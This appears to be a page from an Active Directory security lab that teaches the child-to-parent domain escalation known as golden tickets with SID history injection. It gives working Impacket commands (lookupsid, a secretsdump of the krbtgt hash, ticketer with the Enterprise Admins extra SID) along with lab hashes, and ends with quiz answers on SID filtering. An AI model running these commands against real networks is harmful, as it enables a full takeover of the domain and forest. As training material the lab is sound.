#Trustpocalypse

The Trustpocalypse attack illustrates how an attacker can navigate from one domain to others very easily, once a single domain has been compromised.

Throughout this lab, we've seen multiple ways of compromising the north domain. Recall one of them in order to retrieve the krbtgt account's hash, which is needed in this attack.

With the krbtgt's account hash, we can forge golden tickets, as seen in the 'Golden Tickets' section of this lab. What if I told you that with this hash we can also forge tickets with admin access on other domains? This way, by compromising a single domain (which isn't an easy task, don't get me wrong), an attacker can then easily (yes, then it's easy) compromise other trusting entire domains.

This can be done through the SID history mechanism in AD. Basically, the attacker can add the Enterprise Admins SID to the forged ticket, granting the attacker Enterprise Admin privileges (Admin Privileges in every domain of the forest). This way, the attacker can compromise other domains. This is only possible in trusts that do not enforce SID filtering, which is the case of intra-forest trusts by default, which in our lab, is established between the NORTH and the ALTAIR domain. This allows this kind of SID injection to succeed.

First, the attacker needs to find which are the SIDs that will be needed for this process. Its own domain SID, as well as the Forest Root domain SID (altair's SID in our case):
```
#These commands are here used with an admin hash, please retrieve your hash and replace it in these commands. Through other attacks we were able to retrieve the admins hash. If you dont have the hash, go back to these attacks and retrieve it
lookupsid.py -no-pass -hashes aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86 -domain-sids north.altair.local/Administrator@192.168.122.20 0 #altair.local domain SID
lookupsid.py -no-pass -hashes aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86 -domain-sids north.altair.local/Administrator@192.168.122.10 0 #north.altair.local domain SID
```

Now we have the required SIDs to this attack. To get the EA SID, we just need to add -519 at the end of altair's domain SID.

Now, we can build a TGT that includes the EA SID, and thus we’ll have full administrator access in altair, from the north domain. For that, we’ll use the 'ticketer.py' script from Impacket. To use the 'ticketer.py' script, we’ll need the krbtgt account’s NT hash. Retrieve it using 'secretsdump.py' script with the admin hashes. Then, retrieve the NT hash and use it in the script.

```
#get the krbtgt account hash
secretsdump.py north.altair.local/administrator@192.168.122.10 -hashes aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86
#[+] krbtgt:502:aad3b435b51404eeaad3b435b51404ee:640464e963ce78864650de778a6b9c31:::

#The -domain-sid argument is the sid from the current domain, north. then the -extra-sid argument is the EA SID, the altair's SID + -519
ticketer.py -nthash 640464e963ce78864650de778a6b9c31 -domain-sid S-1-5-21-1162943719-2261011477-1519509434 -domain north.altair.local -extra-sid S-1-5-21-1073456172-1737515156-949376640-519 berntheman
export KRB5CCNAME=/your/dir/berntheman.ccache
secretsdump.py -k -no-pass -just-dc-ntlm north.altair.local/berntheman@chief.altair.local
```

Et voilà, we've compromised a trusting domain with a single ticket, which we can forge since we've compromised the trusted domain. On one sweep, an entire domain is compromised. Very scary.

!!! question
    Can inter-forest trusts be attacked in this manner? Explain the mechanism that prevents it.
??? success "Answer"
    No, not by default. By default inter-forest trusts have SID filtering enabled. The SID filtering mechanism filters out SIDs that do not pertain to the domain from which the ticket is being sent from. This means that, in the case of this attack, if SID filtering was enabled, the attacker could not use a ticket that held the EA SID since this specific SID pertains to the altair domain, and not the north domain. Only SIDs from north would not be filtered by the SID filtering mechanism.
!!! question
    Why was the SID history mechanism implemented?
??? success "Answer" 
    The SID history mechanism was implemented to simplify the migration of users or computers between domains. When a security principal moves from one domain (like north) to another (altair, for example), their SID changes because part of the SID is the domain SID.
    Access to resources is controlled by ACLs tied to specific SIDs, so without SID history, admins would need to manually reconfigure permissions on all resources the user previously accessed — a tedious task.
    With SID history, the migrated account retains its old SID in its authentication token, allowing it to access resources in the old domain without modifying any ACLs.

